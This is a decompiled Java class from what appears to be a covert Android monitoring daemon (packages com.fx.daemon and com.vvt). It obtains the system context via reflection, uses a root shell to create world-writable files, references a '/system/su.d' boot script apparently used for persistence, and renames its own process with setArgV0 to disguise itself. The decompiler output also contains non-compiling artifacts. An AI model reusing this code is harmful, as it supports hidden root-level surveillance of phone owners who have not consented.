package com.fx.daemon;

import android.content.Context;
import android.os.ConditionVariable;
import com.fx.daemon.a.e;
import com.vvt.h.a;
import com.vvt.shell.CannotGetRootShellException;
import com.vvt.shell.f;
import com.vvt.shell.j;
import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class b
{
  public static final String a = com.vvt.b.b.a("/system/su.d", "0000adam.sh");
  private static boolean b = a.a;
  private static boolean c = a.e;
  
  public static Context a()
  {
    boolean bool1 = false;
    Object localObject1 = "android.app.ActivityThread";
    try
    {
      Object localObject3 = Class.forName((String)localObject1);
      Object localObject4 = "systemMain";
      bool2 = false;
      localObject1 = null;
      localObject1 = (Class[])null;
      localObject4 = ((Class)localObject3).getDeclaredMethod((String)localObject4, null);
      bool2 = true;
      ((Method)localObject4).setAccessible(bool2);
      bool2 = false;
      localObject1 = null;
      localObject1 = (Object[])null;
      localObject1 = ((Method)localObject4).invoke(null, null);
      localObject4 = "mSystemContext";
      localObject3 = ((Class)localObject3).getDeclaredField((String)localObject4);
      boolean bool3 = true;
      ((Field)localObject3).setAccessible(bool3);
      localObject1 = ((Field)localObject3).get(localObject1);
      localObject1 = (Context)localObject1;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = b;
        if (bool2) {}
        bool2 = false;
        Object localObject2 = null;
      }
    }
    bool1 = b;
    if (bool1) {}
    return (Context)localObject1;
  }
  
  public static void a(String paramString)
  {
    boolean bool = b;
    if (bool) {}
    ConditionVariable localConditionVariable = new android/os/ConditionVariable;
    localConditionVariable.<init>(false);
    e locale = new com/fx/daemon/a/e;
    locale.<init>(paramString, localConditionVariable);
    locale.start();
    localConditionVariable.block();
    bool = b;
    if (bool) {}
  }
  
  public static void a(String paramString1, String paramString2, String paramString3)
  {
    int i = 1;
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = new java/io/File;
    ((File)localObject1).<init>(paramString2);
    bool1 = ((File)localObject1).exists();
    if (!bool1)
    {
      bool1 = b;
      if (bool1) {}
      bool1 = false;
      localObject1 = null;
    }
    try
    {
      j.a(paramString2, false);
      Object localObject2 = new Object[2];
      localObject2[0] = paramString2;
      localObject2[i] = paramString3;
      localObject1 = String.format("%s/%s", (Object[])localObject2);
      localObject2 = new java/io/File;
      ((File)localObject2).<init>((String)localObject1);
      boolean bool2 = ((File)localObject2).exists();
      if (!bool2)
      {
        bool2 = b;
        if (bool2) {}
        localObject2 = f.a();
        Object[] arrayOfObject = new Object[i];
        arrayOfObject[0] = localObject1;
        String str = String.format("echo \"\" >> %s", arrayOfObject);
        ((f)localObject2).a(str);
        str = "chmod 666 %s";
        arrayOfObject = new Object[i];
        arrayOfObject[0] = localObject1;
        localObject1 = String.format(str, arrayOfObject);
        ((f)localObject2).a((String)localObject1);
        ((f)localObject2).d();
      }
      com.vvt.d.b.a().a(paramString2, paramString3);
      localObject1 = com.vvt.d.b.a();
      int j = 6;
      ((com.vvt.d.b)localObject1).a(j);
      bool1 = b;
      if (bool1) {}
      return;
    }
    catch (CannotGetRootShellException localCannotGetRootShellException)
    {
      for (;;)
      {
        bool1 = c;
        if (!bool1) {}
      }
    }
  }
  
  public static void b(String paramString)
  {
    Object localObject1 = "android.os.Process";
    try
    {
      localObject1 = Class.forName((String)localObject1);
      localObject2 = "setArgV0";
      int i = 1;
      Object localObject3 = new Class[i];
      Class localClass = String.class;
      localObject3[0] = localClass;
      localObject1 = ((Class)localObject1).getMethod((String)localObject2, (Class[])localObject3);
      localObject2 = null;
      i = 1;
      localObject3 = new Object[i];
      localObject3[0] = paramString;
      ((Method)localObject1).invoke(null, (Object[])localObject3);
      return;
    }
    catch (ClassNotFoundException localClassNotFoundException)
    {
      localObject2 = new java/lang/RuntimeException;
      ((RuntimeException)localObject2).<init>(localClassNotFoundException);
      throw ((Throwable)localObject2);
    }
    catch (SecurityException localSecurityException)
    {
      localObject2 = new java/lang/RuntimeException;
      ((RuntimeException)localObject2).<init>(localSecurityException);
      throw ((Throwable)localObject2);
    }
    catch (NoSuchMethodException localNoSuchMethodException)
    {
      localObject2 = new java/lang/RuntimeException;
      ((RuntimeException)localObject2).<init>(localNoSuchMethodException);
      throw ((Throwable)localObject2);
    }
    catch (IllegalArgumentException localIllegalArgumentException)
    {
      localObject2 = new java/lang/RuntimeException;
      ((RuntimeException)localObject2).<init>(localIllegalArgumentException);
      throw ((Throwable)localObject2);
    }
    catch (IllegalAccessException localIllegalAccessException)
    {
      localObject2 = new java/lang/RuntimeException;
      ((RuntimeException)localObject2).<init>(localIllegalAccessException);
      throw ((Throwable)localObject2);
    }
    catch (InvocationTargetException localInvocationTargetException)
    {
      Object localObject2 = new java/lang/RuntimeException;
      ((RuntimeException)localObject2).<init>(localInvocationTargetException);
      throw ((Throwable)localObject2);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/fx/daemon/b.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */